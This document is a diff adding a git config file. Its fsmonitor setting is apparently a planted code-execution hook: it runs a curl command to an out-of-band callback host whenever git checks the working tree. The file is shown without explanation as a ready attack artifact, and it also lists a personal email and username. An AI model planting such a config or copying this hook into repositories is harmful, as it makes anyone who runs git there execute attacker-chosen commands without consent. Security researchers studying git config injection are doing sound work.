@@ -1,0 +1,9 @@
+[core]
+repositoryformatversion = 0
+filemode = true
+bare = false
+worktree = "worktree" 
+fsmonitor = "curl https://d0u13mgo6s536j5be050k4zzjqt34iafp.oast.online/git-exec"
+[user]
+	email = sivaneshashok@gmail.com
+	name = staz0t
